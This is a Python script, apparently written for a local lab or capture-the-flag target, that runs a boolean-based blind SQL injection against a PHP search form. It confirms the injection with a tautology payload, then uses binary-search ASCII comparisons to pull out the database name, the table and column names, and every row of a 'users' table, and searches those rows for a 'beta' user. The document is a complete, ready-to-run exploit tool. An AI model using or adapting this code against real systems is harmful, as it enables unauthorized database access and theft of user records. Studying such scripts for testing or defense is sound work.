import requests
import time

# Target configuration
URL = "http://127.0.0.1:8080/search.php"
COOKIES = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}

def test_query(payload):
    """Test a SQL injection payload and return True if condition is true"""
    data = {"username": payload}
    try:
        response = requests.post(URL, data=data, cookies=COOKIES, timeout=5)
        # Baseline is "You are connected successfully!<br/> No results"
        # True condition will show different response
        baseline = "No results"
        return baseline not in response.text and "You are connected successfully" in response.text
    except Exception as e:
        print(f"[ERROR] {e}")
        return False

def binary_search_char(query_template, position):
    """Use binary search to find a character at given position"""
    low, high = 32, 126
    
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING(({query_template}),{position},1))>{mid}-- "
        
        if test_query(payload):
            low = mid + 1
        else:
            high = mid - 1
    
    if low <= 126:
        payload = f"' AND ASCII(SUBSTRING(({query_template}),{position},1))={low}-- "
        if test_query(payload):
            return chr(low)
    
    return None

def extract_string(query_template, max_length=30):
    """Extract a complete string using binary search"""
    result = ""
    
    for position in range(1, max_length + 1):
        char = binary_search_char(query_template, position)
        
        if char is None or ord(char) < 32:
            break
        
        result += char
        print(f"  Position {position}: '{char}' -> '{result}'")
    
    return result

print("[*] Starting Boolean-based Blind SQL Injection")
print(f"[*] Target: {URL}")

# Test injection
print("\n[*] Testing SQL injection...")
test = "' OR '1'='1'-- "
if test_query(test):
    print("[+] SQL injection confirmed!")

# Step 1: Extract database name
print("\n[STEP 1] Extracting database name...")
database_name = extract_string("SELECT database()")
print(f"[+] Database: {database_name}\n")

# Step 2: Count and extract tables
print("[STEP 2] Extracting table names...")
num_tables = 0
for i in range(1, 10):
    payload = f"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database_name}')={i}-- "
    if test_query(payload):
        num_tables = i
        break

print(f"[+] Number of tables: {num_tables}")

tables = []
for i in range(num_tables):
    print(f"\n[*] Extracting table {i+1}/{num_tables}...")
    query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT {i},1"
    table = extract_string(query, 20)
    tables.append(table)
    print(f"[+] Table: {table}")

# Step 3: Extract columns from users table
print(f"\n[STEP 3] Extracting columns from 'users' table...")
num_cols = 0
for i in range(1, 10):
    payload = f"' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{database_name}' AND table_name='users')={i}-- "
    if test_query(payload):
        num_cols = i
        break

print(f"[+] Number of columns: {num_cols}")

columns = []
for i in range(num_cols):
    print(f"\n[*] Extracting column {i+1}/{num_cols}...")
    query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database_name}' AND table_name='users' LIMIT {i},1"
    col = extract_string(query, 20)
    columns.append(col)
    print(f"[+] Column: {col}")

# Step 4: Count rows
print(f"\n[STEP 4] Counting rows in users table...")
num_rows = 0
for i in range(1, 20):
    payload = f"' AND (SELECT COUNT(*) FROM users)={i}-- "
    if test_query(payload):
        num_rows = i
        break

print(f"[+] Number of rows: {num_rows}")

# Step 5: Extract data
print(f"\n[STEP 5] Extracting user data...")
all_users = []

for row in range(num_rows):
    print(f"\n--- Row {row+1}/{num_rows} ---")
    user_data = {}
    
    for col in columns:
        print(f"[*] Extracting {col}...")
        query = f"SELECT {col} FROM users LIMIT {row},1"
        value = extract_string(query, 50)
        user_data[col] = value
        print(f"[+] {col}: {value}")
    
    all_users.append(user_data)

# Step 6: Look for beta user
print("\n" + "="*60)
print("SEARCHING FOR 'beta' USER")
print("="*60)

for idx, user in enumerate(all_users):
    for key, value in user.items():
        if 'beta' in value.lower():
            print(f"\n[!] FOUND 'beta' in User {idx+1}!")
            print(f"[!] Field: {key}")
            print(f"[!] Value: {value}")
            print(f"[!] Complete record:")
            for k, v in user.items():
                print(f"    {k}: {v}")

# Summary
print("\n" + "="*60)
print("COMPLETE EXTRACTION SUMMARY")
print("="*60)
print(f"Database: {database_name}")
print(f"Tables: {', '.join(tables)}")
print(f"Columns: {', '.join(columns)}")
print(f"\nAll Users:")
for idx, user in enumerate(all_users):
    print(f"\nUser {idx+1}:")
    for key, value in user.items():
        print(f"  {key}: {value}")

print("\n[*] Extraction complete!")

